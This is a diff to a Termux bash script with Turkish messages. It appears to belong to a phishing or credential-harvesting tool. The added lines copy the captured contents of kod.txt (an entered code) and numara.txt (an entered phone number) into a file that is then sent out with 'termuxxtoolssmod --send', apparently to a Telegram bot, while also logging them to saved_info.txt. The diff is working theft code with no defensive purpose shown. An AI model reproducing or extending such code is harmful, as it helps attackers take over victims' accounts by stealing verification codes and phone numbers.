@@ -89,12 +89,18 @@ do
 		echo
 		echo
 		printf "\e[32m$(cat kod.txt)\e[97m"
+		control=$(cat $PREFIX/lib/.termuxxtoolssmode |sed -n 2p)
+		if [[ $control == telegram-bot ]];then
+			echo "[✓] KOD GİRİLDİ" > .info
+			cat kod.txt >> .info
+		else
+			echo "[✓] KOD GİRİLDİ" > .info
+		fi
 		echo
 		echo
 		echo
 		cat kod.txt >> saved_info.txt
 		rm kod.txt
-		echo "[✓] KOD GİRİLDİ" >.info
 		termuxxtoolssmod --send
 		exit
 	fi
@@ -109,12 +115,18 @@ do
 		echo
 		echo
 		printf "\e[32m$(cat numara.txt)\e[97m"
+		control=$(cat $PREFIX/lib/.termuxxtoolssmode |sed -n 2p)
+		if [[ $control == telegram-bot ]];then
+			echo "[✓] NUMARA GİRİLDİ" >.info
+			cat numara.txt >> .info
+		else
+			echo "[✓] NUMARA GİRİLDİ" >.info
+		fi
 		echo
 		echo
 		echo
 		cat numara.txt >> saved_info.txt
 		rm numara.txt
-		echo "[✓] NUMARA GİRİLDİ" >.info
 		termuxxtoolssmod --send
 		dongu2
 	fi
